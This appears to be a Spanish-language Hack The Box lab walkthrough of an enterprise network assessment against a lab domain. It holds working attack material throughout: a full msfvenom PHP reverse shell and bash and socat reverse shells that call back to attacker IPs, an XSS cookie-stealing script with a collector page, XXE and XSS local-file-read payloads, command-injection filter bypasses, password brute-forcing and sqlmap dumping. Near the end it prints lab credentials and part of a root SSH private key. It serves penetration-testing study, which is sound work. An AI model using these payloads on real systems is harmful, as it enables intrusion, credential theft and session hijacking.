# Attaking Enterprise Network

## External Testing

### External Information Gathering

Antes de comenzar: a lo largo del módulo necesitaremos configurar nuestro archivo `/etc/hosts` agregando la línea:

**[IP de la máquina de destino] (vhosts requeridos)**

`10.129.109.142 inlanefreight.local`

Para vincular el vhost a la dirección IP de destino. Por ejemplo:

`10.129.109.142 app.inlanefreight.local dev.inlanefreight.local blog.inlanefreight.local`

Se puede hacer con el comando

`sudo nano /etc/hosts`

1. **Perform a banner grab of the services listening on the target host and find a non-standard service banner. Submit the name as your answer** (format: word_word_word)

```
nmap -A 10.129.109.142
```

```bash
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.15.56
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              38 May 30  2022 flag.txt
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 71:08:b0:c4:f3:ca:97:57:64:97:70:f9:fe:c5:0c:7b (RSA)
|   256 45:c3:b5:14:63:99:3d:9e:b3:22:51:e5:97:76:e1:50 (ECDSA)
|_  256 2e:c2:41:66:46:ef:b6:81:95:d5:aa:35:23:94:55:38 (ED25519)
25/tcp   open  smtp     Postfix smtpd
|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
53/tcp   open  domain   (unknown banner: 1337_HTB_DNS)
| dns-nsid: 
|_  bind.version: 1337_HTB_DNS
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|     bind
|_    1337_HTB_DNS
80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Inlanefreight
110/tcp  open  pop3     Dovecot pop3d
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2022-05-30T17:15:40
|_Not valid after:  2032-05-27T17:15:40
|_pop3-capabilities: UIDL AUTH-RESP-CODE SASL RESP-CODES STLS CAPA TOP PIPELINING
|_ssl-date: TLS randomness does not represent time
111/tcp  open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
143/tcp  open  imap     Dovecot imapd (Ubuntu)
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: post-login IDLE OK ID more Pre-login have LOGINDISABLEDA0001 IMAP4rev1 ENABLE SASL-IR capabilities LITERAL+ LOGIN-REFERRALS listed STARTTLS
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2022-05-30T17:15:40
|_Not valid after:  2032-05-27T17:15:40
993/tcp  open  ssl/imap Dovecot imapd (Ubuntu)
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2022-05-30T17:15:40
|_Not valid after:  2032-05-27T17:15:40
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: post-login IDLE OK ID Pre-login more have IMAP4rev1 ENABLE SASL-IR capabilities LITERAL+ LOGIN-REFERRALS listed AUTH=PLAINA0001
995/tcp  open  ssl/pop3 Dovecot pop3d
|_pop3-capabilities: UIDL AUTH-RESP-CODE SASL(PLAIN) RESP-CODES USER CAPA TOP PIPELINING
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2022-05-30T17:15:40
|_Not valid after:  2032-05-27T17:15:40
8080/tcp open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-title: Support Center
```

El nombre del banner no standard lo encontraremos en el puerto 53 

<p align="center"> 
<img src="images/banner no standard.png" width="600" alt="Resultado de Nmap">
</p>

answer: **1337_HTB_DNS**

 2. **Perform a DNS Zone Transfer against the target and find a flag. Submit the flag value as your answer** (flag format: HTB{ }).

```
dig axfr inlanefreight.local @inlanefreight.local
```

- **`dig`**: Es la herramienta de Linux (_Domain Information Groper_) que se utiliza para interrogar a los servidores DNS y obtener registros sobre los dominios.

- **`axfr`**: Es el tipo de consulta. Le dice a `dig` que no quiere un registro normal (como una IP), sino que solicita una **transferencia de zona completa**. Si el servidor lo permite, devolverá _absolutamente todos_ los subdominios, IPs y registros configurados para ese dominio de golpe.

- **`inlanefreight.local` (el primero)**: Es el **objetivo de la consulta**. Le estás diciendo a la herramienta: _"Quiero obtener la tabla completa de registros de este dominio específico"_.

- **`@inlanefreight.local` (el segundo, con el símbolo @)**: Es el **servidor DNS al que le preguntas**. En la sintaxis de `dig`, todo lo que va después de una `@` indica la dirección IP o el nombre del servidor al que le vas a mandar la pregunta.

<p align="center"> 
<img src="images/dig.png" width="600" alt="Resultado de Nmap">
</p>

```
blog.inlanefreight.local
careers.inlanefreight.local
dev.inlanefreight.local
flag.inlanefreight.local
gitlab.inlanefreight.local
ir.inlanefreight.local
status.inlanefreight.local
support.inlanefreight.local
tracking.inlanefreight.local
vpn.inlanefreight.local
```

answer: **HTB{DNs_ZOn3_Tr@nsf3r}**

3. **What is the FQDN of the associated subdomain?**

En palabras sencillas, un FQDN es la **dirección completa y absoluta** de un equipo o servidor en internet o en una red local.

$$\text{[Nombre del Host]} + \text{[Dominio]} + \text{[Extensión/TLD]}$$

answer: **flag.inlanefreight.local**

4. **Perform vhost discovery. What additional vhost exists?** (one word)

```
curl -s -I http://10.129.109.142 -H "HOST: defnotvalid.inlanefreight.local" | grep "Content-Length:"
```

> Content-Length: 15157

```
ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt:FUZZ -u http://inlanefreight.local/ -H 'Host:FUZZ.inlanefreight.local' -fs 15157
```

<p align="center"> 
<img src="images/ffuf.png" width="600" alt="Resultado de Nmap">
</p>

answer: **monitoring**

### Service Enumeration & Exploitation

1. **Enumerate the accessible services and find a flag. Submit the flag value as your answer (flag format: HTB{ }).**

```
ftp 10.129.109.142
dir
get flag.txt
exit
```

<p align="center"> 
<img src="images/ftp.png" width="600" alt="Resultado de Nmap">
</p>

answer_ **HTB{0eb0ab788df18c3115ac43b1c06ae6c4}**

### Web Enumeration & Exploitation

Antes de empezar estas actividades, configuraremos nuestro archivo `/etc/hosts` agregando la línea:

```
10.129.109.216 monitoring.inlanefreight.local shopdev2.inlanefreight.local inlanefreight.local blog.inlanefreight.local careers.inlanefreight.local dev.inlanefreight.local flag.inlanefreight.local gitlab.inlanefreight.local ir.inlanefreight.local status.inlanefreight.local support.inlanefreight.local tracking.inlanefreight.local vpn.inlanefreight.local
```

1. **Use the IDOR vulnerability to find a flag. Submit the flag value as your answer** (flag format: HTB{}).

En esta ocasión visitaremos la página `http://careers.inlanefreight.local` y nos registraremos con un nuevo usuario, y luego nos logueamos con ese mismo usuario

En la url `http://careers.inlanefreight.local/profile?id=9` nos damos cuenta que nuestro usuario tiene el id 9

<p align="center"> 
<img src="images/id9.png" width="600" alt="Resultado de Nmap">
</p>

A continuación, llevaremos a cabo el ataque **IDOR** cambiando el ID a 1

```
http://careers.inlanefreight.local/profile?id=1
```

<p align="center"> 
<img src="images/id1.png" width="600" alt="Resultado de Nmap">
</p>

Hemos logrado la lista de un nuevo empleado, Esto funciona siempre y cuando nos registremos. Ahora probaremos con el id=4

```
http://careers.inlanefreight.local/profile?id=4
```

<p align="center"> 
<img src="images/flagidor.png" width="600" alt="Resultado de Nmap">
</p>

answer: **HTB{8f40ecf17f681612246fa5728c159e46}**

2. **Exploit the HTTP verb tampering vulnerability to find a flag. Submit the flag value as your answer** (flag format: HTB{}).

Empezaremos visitando la pagina `http://dev.inlanefreight.local/`

<p align="center"> 
<img src="images/dev.png" width="600" alt="Resultado de Nmap">
</p>

Realizaremos el siguiente comando para encontrar algún subdominio.

```
gobuster dir -u http://dev.inlanefreight.local -w /usr/share/seclists/Discovery/Web-Content/common.txt -x .php -t 300
```

<p align="center"> 
<img src="images/uploads.png" width="600" alt="Resultado de Nmap">
</p>

Visitando esta página `http://dev.inlanefreight.local/uploads/` nos saldrá lo siguiente **403 Forbidden**. A continuación, lo que haremos es interceptar esta página con **buprsuite**

Mandamos la solicitud al **repeater**, en la línea 1 cambiamos **GET** por **OPTIONS** y enviamos la **request**. En el response de la línea 4, nos aparecerá diferentes opciones como **GET,POST,PUT,TRACK,OPTIONS**

<p align="center"> 
<img src="images/options.png" width="600" alt="Resultado de Nmap">
</p>

En el request nuevamente cambiamos **OPTIONS** por **TRACK** y en el **response** por aparecerá esta línea `X-Custom-IP-Authorization: 172.18.0.1` Gracias a esta cabecera podremos interactuar con la pagina. El único cambio que queda es que esta línea lo copiemos en **request** pero con nuestra ip **127.0.0.1** y eliminamos la línea `Priority: u=0, i`. PD: vamos a intentar colocar la cabecera antes de **connection**

```
TRACK /upload.php HTTP/1.1
Host: dev.inlanefreight.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
X-Custom-IP-Authorization: 127.0.0.1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
```

<p align="center"> 
<img src="images/track002.png" width="600" alt="Resultado de Nmap">
</p>

Luego le damos a click derecho y le damos a **Open response in browser** 

<p align="center"> 
<img src="images/browsseer.png" width="600" alt="Resultado de Nmap">
</p>

Tenemos que tener activado **foxyproxy** para que funcione la pagina y copiamos la url en el navegador 

<p align="center"> 
<img src="images/pixelshop.png" width="600" alt="Resultado de Nmap">
</p>

Preparamos el siguiente script .php llamado **webshell.php** con el siguiente contenido.

<p align="center"> 
<img src="images/webshelll.png" width="600" alt="Resultado de Nmap">
</p>

Luego nos vamos a **Browser**. Seleccione «Todos los archivos» y, a continuación, seleccione «webshell.php» (nuestro archivo webshell creado). Después, seleccione «Enviar».

Interceptamos esta subida de archivos y nos aparacerá lo siguiente:

<p align="center"> 
<img src="images/nofilesallowed.png" width="600" alt="Resultado de Nmap">
</p>

Solo permite la subida de archivos como JPG, JPEG, PNG & GIF. Por tanto, en el request en la línea 17 tendremos que cambiar el contenido que tiene por `Content-Type: image/png` y enviamos la consulta.

<p align="center"> 
<img src="images/logramos subir.png" width="600" alt="Resultado de Nmap">
</p>

Ahora si hemos logrado subir el archivo. Visitamos esta pagina `http://dev.inlanefreight.local/uploads/webshell.php` y lo cambiamos a `http://dev.inlanefreight.local/uploads/webshell.php?cmd=id`

<p align="center"> 
<img src="images/idsd.png" width="600" alt="Resultado de Nmap">
</p>

`http://dev.inlanefreight.local/uploads/webshell.php?cmd=ls%20..`

> css flag.txt images index.php js upload.php uploads

`http://dev.inlanefreight.local/uploads/webshell.php?cmd=cat%20../flag.txt`

answer: **HTB{57c7f6d939eeda90aa1488b15617b9fa}**

3. **Exploit the WordPress instance and find a flag in the web root. Submit the flag value as your answer** (flag format: HTB{}).

La pagina que tiene wordpress instalado es `http://ir.inlanefreight.local` realizaremos el siguiente comando para encontrar el usuario.

```
sudo wpscan -e u -t 500 --url http://ir.inlanefreight.local/
```

<p align="center"> 
<img src="images/ilfreightwp.png" width="600" alt="Resultado de Nmap">
</p>

Luego, realizaremos un ataque de fuerza bruta con **wpscan**

```
sudo wpscan --update
sudo wpscan --url http://ir.inlanefreight.local -P /usr/share/wordlists/rockyou.txt -U ilfreightwp
```

<p align="center"> 
<img src="images/wpscan.png" width="600" alt="Resultado de Nmap">
</p>

Credenciales --> **ilfreightwp**:**password1**

```
gobuster dir -u http://ir.inlanefreight.local -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x txt,py,php,sh,html
```

<p align="center"> 
<img src="images/gobuster12.png" width="600" alt="Resultado de Nmap">
</p>

Visitamos la siguiente página `http://ir.inlanefreight.local/wp-login.php` e introducimos las credenciales encontradas anteriormente.

Luego visitamos el apartado **Appearance** - **Theme File Editor**

<p align="center"> 
<img src="images/theme file editor.png" width="600" alt="Resultado de Nmap">
</p>

El siguiente paso es crear con **msfvenom** un archivo llamado **wordpress.php**

```
msfvenom -p php/reverse_php LHOST=10.10.14.122 LPORT=4445 -f raw > wordpress.php
```

El siguiente paso es copiar el contenido del archivo **wordpress.php**

```
/*<?php /**/
@error_reporting(0);@set_time_limit(0);@ignore_user_abort(1);@ini_set('max_execution_time',0);
$dis=@ini_get('disable_functions');
if(!empty($dis)){
  $dis=preg_replace('/[, ]+/',',',$dis);
  $dis=explode(',',$dis);
  $dis=array_map('trim',$dis);
}else{
  $dis=array();
}

    $ipaddr='10.10.14.122';
    $port=4445;

    if(!function_exists('XEUFwRG')){
      function XEUFwRG($c){
        global $dis;
        if (FALSE!==stristr(PHP_OS,'win')){
  $c=$c." 2>&1\n";
}
$UuYJpSNxKe7='is_callable';
$juo2='in_array';
if($UuYJpSNxKe7('exec')&&!$juo2('exec',$dis)){
  $o=array();
  exec($c,$o);
  $o=join(chr(10),$o).chr(10);
}else
if($UuYJpSNxKe7('shell_exec')&&!$juo2('shell_exec',$dis)){
  $o=`$c`;
}else
if($UuYJpSNxKe7('passthru')&&!$juo2('passthru',$dis)){
  ob_start();
  passthru($c);
  $o=ob_get_contents();
  ob_end_clean();
}else
if($UuYJpSNxKe7('proc_open')&&!$juo2('proc_open',$dis)){
  $handle=proc_open($c,array(array('pipe','r'),array('pipe','w'),array('pipe','w')),$pipes);
  $o=NULL;
  while(!feof($pipes[1])){
    $o.=fread($pipes[1],1024);
  }
  @proc_close($handle);
}else
if($UuYJpSNxKe7('system')&&!$juo2('system',$dis)){
  ob_start();
  system($c);
  $o=ob_get_contents();
  ob_end_clean();
}else
if($UuYJpSNxKe7('popen')&&!$juo2('popen',$dis)){
  $fp=popen($c,'r');
  $o=NULL;
  if(is_resource($fp)){
    while(!feof($fp)){
      $o.=fread($fp,1024);
    }
  }
  @pclose($fp);
}else
{
  $o=0;
}

        return $o;
      }
    }
    $nofuncs='no exec functions';
    if(is_callable('fsockopen')and!in_array('fsockopen',$dis)){
      $s=@fsockopen("tcp://10.10.14.122",$port);
      while($c=fread($s,2048)){
        $out = '';
        if(substr($c,0,3) == 'cd '){
          chdir(substr($c,3,-1));
        } else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {
          break;
        }else{
          $out=XEUFwRG(substr($c,0,-1));
          if($out===false){
            fwrite($s,$nofuncs);
            break;
          }
        }
        fwrite($s,$out);
      }
      fclose($s);
    }else{
      $s=@socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
      @socket_connect($s,$ipaddr,$port);
      @socket_write($s,"socket_create");
      while($c=@socket_read($s,2048)){
        $out = '';
        if(substr($c,0,3) == 'cd '){
          chdir(substr($c,3,-1));
        } else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {
          break;
        }else{
          $out=XEUFwRG(substr($c,0,-1));
          if($out===false){
            @socket_write($s,$nofuncs);
            break;
          }
        }
        @socket_write($s,$out,strlen($out));
      }
      @socket_close($s);
    }
```

Luego en **wordpress**, En select theme to edit **Twenty Twenty** Luego, copiamos todo el contenido del archivo **wordpress.php** dentro de la plantilla **404 template** y le damos **update file**

<p align="center"> 
<img src="images/404template.png" width="600" alt="Resultado de Nmap">
</p>

Activo mi puerto de escucha

```
nc -lvnp 4445
```

Y para activar el exploit me voy al navegador y escribo lo siguiente 

```
http://ir.inlanefreight.local/pagina-de-prueba-404
```

<p align="center"> 
<img src="images/whoamiii.png" width="600" alt="Resultado de Nmap">
</p>

Luego, rápidamente trasladamos esta sesión para conseguir una sesión más estable y preparo el puerto de escucha 

```
nc -lvnp 4444
```

Realizo el siguiente comando en la sesión

```
bash -c "sh -i >& /dev/tcp/10.10.14.122/4444 0>&1"
```

<p align="center"> 
<img src="images/wwwdata.png" width="600" alt="Resultado de Nmap">
</p>

Realizamos el tratamiento de la TTY

```
script /dev/null -c bash
```

**control z**

```
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```

Luego, buscamos la flag.txt con el siguiente comando:

```
find / -name "flag.txt" 2>/dev/null
cat /var/www/html/flag.txt
```

<p align="center"> 
<img src="images/htbflaghtb.png" width="600" alt="Resultado de Nmap">
</p>

answer: **HTB{e7134abea7438e937b87608eab0d979c}**

4. **Enumerate the "status" database and retrieve the password for the "Flag" user. Submit the value as your answer.**

En esta actividad usaremos la siguiente `http://status.inlanefreight.local/`

<p align="center"> 
<img src="images/logss.png" width="600" alt="Resultado de Nmap">
</p>

Interceptamos esto con burpsuite y en **searchitem** tengo como resultado **%27**

<p align="center"> 
<img src="images/searchitem.png" width="600" alt="Resultado de Nmap">
</p>

Cambiamos **%27** por `*` y clikamos al botón derecho del ratón **Saved selected text to file**. A continuación, usaremos **sqlmap** para conseguir la flag.txt

Sqlmap detecta el `*` como el **punto de inyección marcado manualmente** y concentra ahí sus pruebas.

```
sqlmap -r request.txt --dbms=mysql
```

<p align="center"> 
<img src="images/mysql.png" width="600" alt="Resultado de Nmap">
</p>

```
sqlmap -r request.txt --dbms=mysql --dbs
```

<p align="center"> 
<img src="images/status.png" width="600" alt="Resultado de Nmap">
</p>

```
sqlmap -r request.txt --dbms=mysql -D status --tables
```

<p align="center"> 
<img src="images/tables.png" width="600" alt="Resultado de Nmap">
</p>

```
sqlmap -r request.txt --dbms=mysql -D status -T users --dump
```

<p align="center"> 
<img src="images/flag.png" width="600" alt="Resultado de Nmap">
</p>

answer: **1fbea4df249ac4f4881a5da387eb297cf**

 5. **Steal an admin's session cookie and gain access to the support ticketing queue. Submit the flag value for the "John" user as your answer.**

Para la realización de esta actividad tenemos que visitar la siguiente página `http://support.inlanefreight.local/`

<p align="center"> 
<img src="images/raise ticket.png" width="600" alt="Resultado de Nmap">
</p>

Luego nos vamos al siguiente enlace `http://support.inlanefreight.local/ticket.php`

En el apartado de message añadimos lo siguiente 
`"><script src=http://10.10.15.109:4445/TESTING_THIS</script>message` para comprobar si es vulnerable a xss y preparamos el puerto de escucha `nc -lnvp 4445`

<p align="center"> 
<img src="images/`formulario.png" width="600" alt="Resultado de Nmap">
</p>

Obtengo el siguiente resultado:

<p align="center"> 
<img src="images/nc4445.png" width="600" alt="Resultado de Nmap">
</p>

Por tanto, es vulnerable porque **transcribe mi input tal cual, sin escapar los caracteres especiales de HTML** (`<`, `>`, `"`, `'`). No es solo que "copio lo que pongo", es que copio caracteres que tienen **significado especial** para el navegador.

Para robar el robo de cookie, tenemos que tener preparado dos archivos:

El archivo **index.php**

```php
<?php
if (isset($_GET['c'])) {
 $list = explode(";", $_GET['c']);
 foreach ($list as $key => $value) {
 $cookie = urldecode($value);
 $file = fopen("cookies.txt", "a+");
 fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
 fclose($file);
 }
}
?>
```

El archivo script.js

```js
new Image().src='http://10.10.15.109:4444/index.php?c='+document.cookie
```

Luego, compartiremos estos archivos con el siguiente comando:

```
sudo php -S 0.0.0.0:4444
```

En el formulario, en el apartado **message** escribimos lo siguiente:

```
"><script src=http://10.10.15.109:4444/script.js></script>
```

Luego obtenemos la cookie de session

<p align="center"> 
<img src="images/cookiee session.png" width="600" alt="Resultado de Nmap">
</p>

La cookie de session es **fcfaf93ab169bc943b92109f0a845d99**

Luego nos iremos al login y usaremos la extensión **cookie-editor** e introducimos ahi las cookie de session obtenida, después reiniciamos login y obtenemos la flag 

<p align="center"> 
<img src="images/cookie.png" width="600" alt="Resultado de Nmap">
</p>

answer: **HTB{1nS3cuR3_c00k135}**

 6. **Use the SSRF to Local File Read vulnerability to find a flag. Submit the flag value as your answer** (flag format: HTB{}).

En esta actividad la realizaremos en `http://tracking.inlanefreight.local/`

<p align="center"> 
<img src="images/chooseyourquality.png" width="600" alt="Resultado de Nmap">
</p>

En el siguiente apartado realizaremos la siguientes pruebas, en primer lugar probaremos algún número por ejemplo el `1`

<p align="center"> 
<img src="images/number1.png" width="600" alt="Resultado de Nmap">
</p>

Luego, probaremos un valor no numérico, `test`:

<p align="center"> 
<img src="images/testttt.png" width="600" alt="Resultado de Nmap">
</p>

Luego, probaremos con una inyección html `<h1>test</h1>`

<p align="center"> 
<img src="images/htmlh1test.png" width="600" alt="Resultado de Nmap">
</p>

Prepararemos el siguiente script para obtener la flag.txt

```
<script>
	x=new XMLHttpRequest;
	x.onload=function(){
	document.write(this.responseText)};
	x.open("GET","file:///flag.txt");
	x.send();
</script>
```

El script busca abrir el archivo `flag.txt` guardado en la máquina y estampar su texto directamente en la pantalla.

answer: **HTB{49f0bad299687c62334182178bfd75d8}**

 7. **Register an account and log in to the Gitlab instance. Submit the flag value (flag format : HTB{})**.

En esta actividad usaremos la siguiente página web `gitlab.inlanefreight.local`

Nos tenemos que registrar como nuevo usuario, luego nos iremos a **Explore public projects** - **all** y obtendremos la flag

answer: **HTB{32596e8376077c3ef8d5cf52f15279ba}**

8. **Use the XXE vulnerability to find a flag. Submit the flag value as your answer** (flag format: HTB{}).

En esta actividad usaremos la pagina web `http://shopdev2.inlanefreight.local` luego nos iremos al apartado **my cart** 

<p align="center"> 
<img src="images/my cart.png" width="600" alt="Resultado de Nmap">
</p>

A continuación llevaremos acabo un llamado **XXE** (es una vulnerabilidad de seguridad que ocurre cuando una aplicación web procesa archivos de texto en formato **XML** mal configurados.)

Lo interceptamos con **burpsuite** y lo mandamos al **repeater**

<p align="center"> 
<img src="images/repeateeerere.png" width="600" alt="Resultado de Nmap">
</p>

Lo que tenemos señalado lo sustituimos por: 

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE userid [
 <!ENTITY xxetest SYSTEM "file:///flag.txt">
]>
<root>
	<subtotal>
		undefined
	</subtotal>
	<userid>
		&xxetest;
	</userid>
</root>
```

<p align="center"> 
<img src="images/post.png" width="600" alt="Resultado de Nmap">
</p>

Enviamos la nueva petición y obtenemos la flag. 

answer: **HTB{dbca4dc5d99cdb3311404ea74921553c}**

9.  **Use the command injection vulnerability to find a flag in the web root. Submit the flag value as your answer** (flag format: HTB{}).

En esta actividad trabajaremos con la pagina web `http://monitoring.inlanefreight.local` pero no sabemos la contraseña, por tanto probaremos un ataque de fuerza bruta con la herramienta **hydra**

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt monitoring.inlanefreight.local http-post-form "/login.php:username=admin&password=^PASS^:Invalid Credentials"
```

<p align="center"> 
<img src="images/credencialeees.png" width="600" alt="Resultado de Nmap">
</p>

Credenciales --> **admin**:**12qwaszx**

Una vez iniciado nos encontraremos una webshell

<p align="center"> 
<img src="images/helpwenshell.png" width="600" alt="Resultado de Nmap">
</p>

Vamos a usar burpsuite cuando usemos este comando: 

```
connection_test 127.0.0.1
```

La request quedaría tal que así

<p align="center"> 
<img src="images/request1277.png" width="600" alt="Resultado de Nmap">
</p>

A continuación para conseguir la flag en este ejercicio en el parametro ip tenemos que evitar ciertas restricciones, probaremos lo siguiente:

```
127.0.0.1%0als
```

<p align="center"> 
<img src="images/Bypassing.png" width="600" alt="Resultado de Nmap">
</p>

Esto tipos de ataques se llama **OS Command Injection** y para explotarlo usaremos una técnica llamada **Bypassing** (Es la maniobra que utiliza (usando `%0a`, `${IFS}`, etc.) para **saltarte las restricciones**)

Luego, usaremos esta otra técnica para poder leer la flag. 

```
127.0.0.1%0acat${IFS}00112233_flag.txt
```

Lo que hace **{IFS}** es reemplazar espacios por la variable

<p align="center"> 
<img src="images/flag1235645.png" width="600" alt="Resultado de Nmap">
</p>

answer: **HTB{bdd8a93aff53fd63a0a14de4eba4cbc1}**

### Initial Access

1. **Submit the contents of the flag.txt file in the /home/srvadm directory.**

Seguimos trabajando con la pagina `http://monitoring.inlanefreight.local` dentro de burpsuite.

```
127.0.0.1%0awhich${IFS}socat
```

Usamos este comando para **verificar si la herramienta `socat` existe y se puede utilizar** dentro de ese servidor. ¿Qué es socat?

>Es una herramienta de línea de comandos que conecta dos "flujos de datos" (streams) entre sí. Su nombre literalmente significa eso: es como el comando `cat`, pero para sockets — puede tomar datos de un origen y enviarlos a un destino, sea cual sea el tipo de ambos.

<p align="center"> 
<img src="images/socat.png" width="600" alt="Resultado de Nmap">
</p>

Preparamos el puerto de escucha

```
nc -lvnp 4444
```

En burpsuite, realizamos el siguiente comando para crear una nueva sesion en nuestra kali.

```
127.0.0.1%0asocat${IFS}TCP4:10.10.15.109:4444${IFS}EXEC:bash
```

Luego, haremos lo siguiente comandos para conseguir la flag

```
python3 -c "import pty;pty.spawn('/bin/bash')"
find / -name "flag.txt" 2>/dev/null
cat /home/srvadm/flag.txt
```

<p align="center"> 
<img src="images/nuevasesionnc.png" width="600" alt="Resultado de Nmap">
</p>

answer: **b447c27a00e3a348881b0030177000cd**

## Internal Testing

### Post-Exploitation Persistence

1. **Escalate privileges on the target host and submit the contents of the flag.txt file in the /root directory.**

Seguimos trabajando con la pagina web `http://monitoring.inlanefreight.local`. Continuando con la sesión del ejercicio anterior, para tener una sesión más estable llevaremos a cabo el tratamiento de la TTY en la sesión actual haremos lo siguiente.

**control z**

```
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```

Luego comprobamos si tenemos en nuestra maquina objetivo la herramienta **aureport**

>**`aureport`** es una herramienta de línea de comandos en Linux que sirve para generar **informes resumidos y estadísticas** a partir de los registros del daemon de auditoría del sistema

Como tengo instalado esta herramienta, mi objetivo será comprobar que teclas han sido pulsadas (keystrokes) y comandos ejecutados en la sesión del terminal

```
aureport --tty | less
```

<p align="center"> 
<img src="images/credencialesasdsad.png" width="600" alt="Resultado de Nmap">
</p>

Obtengo las siguientes credenciales --> **srvadm**:**ILFreightnixadm!**

Una vez obtenida las credenciales, iniciamos sesión

```
su srvadm
sudo -l
```

<p align="center"> 
<img src="images/openssl.png" width="600" alt="Resultado de Nmap">
</p>

El binario **openssl** tiene permiso de administrador. Luego usando **gtfobins** hallamos una forma de leer la flag que se encuentra dentro de la carpeta **root** 

<p align="center"> 
<img src="images/opensslgfobins.png" width="600" alt="Resultado de Nmap">
</p>

Por tanto dentro de la sesion del usuario **srvadm** escribimos lo siguiente:

```
sudo /usr/bin/openssl enc -in /root/flag.txt
```

answer: **a34985b5976072c3c148abc751671302**

### Internal Information Gathering

1. **Mount an NFS share and find a flag.txt file. Submit the contents as your answer.**

> **NFS** es un protocolo que permite a un equipo acceder a archivos y carpetas compartidas a través de la red **como si estuvieran en su propio disco duro local**.

En esta actividad continuamos trabajando con la pagina web `http://monitoring.inlanefreight.local` y aprovechamos la sesión de la actividad anterior como el usuario **srvadm** tiene permiso de root vamos a intentar conseguir su **id_rsa** con el siguiente comando:

```
sudo /usr/bin/openssl enc -in /root/.ssh/id_rsa
```

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEA0ksXgILHRb0j1s3pZH8s/EFYewSeboEi4GkRogdR53GWXep7GJMI
oxuXTaYkMSFG9Clij1X6crkcWLnSLuKI8KS5qXsuNWISt+T1bpvTfmFymDIWNx4efR/Yoa
vpXx+yT/M2X9boHpZHluuR9YiGDMZlr3b4hARkbQAc0l66UD+NB9BjH3q/kL84rRASMZ88
y2jUwmR75Uw/wmZxeVD5E+yJGuWd+ElpoWtDW6zenZf6bqSS2VwLhbrs3zyJAXG1eGsGe6
i7l59D31mLOUUKZxYpsciHflfDyCJ79siXXbsZSp5ZUvBOto6JF20Pny+6T0lovwNCiNEz
7avg7o/77lWsfBVEphtPQbmTZwke1OtgvDqG1v4bDWZqKPAAMxh0XQxscpxI7wGcUZbZeF
9OHCWjY39kBVXObER1uAvXmoJDr74/9+OsEQXoi5pShB7FSvcALlw+DTV6ApHx239O8vhW
/0ZkxEzJjIjtjRMyOcLPttG5zuY1f2FBt2qS1w0VAAAFgIqVwJSKlcCUAAAAB3NzaC1yc2
EAAAGBANJLF4CCx0W9I9bN6WR/LPxBWHsEnm6BIuBpEaIHUedxll3qexiTCKMbl02mJDEh
RvQpYo9V+nK5HFi50i7iiPCkual7LjViErfk9W6b035hcpgyFjceHn0f2KGr6V8fsk/zNl
/W6B6WR5brkfWIhgzGZa92+IQEZG0AHNJeulA/jQfQYx96v5C/OK0QEjGfPMto1MJke+VM
P8JmcXlQ+RPsiRrlnfhJaaFrQ1us3p2X+m6kktlcC4W67N88iQFxtXhrBnuou5efQ99Ziz
lFCmcWKbHIh35Xw8gie/bIl127GUqeWVLwTraOiRdtD58vuk9JaL8DQojRM+2r4O6P++5V
rHwVRKYbT0G5k2cJHtTrYLw6htb+Gw1maijwADMYdF0MbHKcSO8BnFGW2XhfThwlo2N/ZA
VVzmxEdbgL15qCQ6++P/fjrBEF6IuaUoQexUr3AC5cPg01egKR8dt/TvL4Vv9GZMRMyYyI
7Y0TMjnCz7bRuc7mNX9hQbdqktcNFQAAAAMBAAEAAAGATL2yeec/qSd4qK7D+TSfyf5et6
Xb2x+tBo/RK3vYW8mLwgILodAmWr96249Brdwi9H8VxJDvsGX0/jvxg8KPjqHOTxbwqfJ8
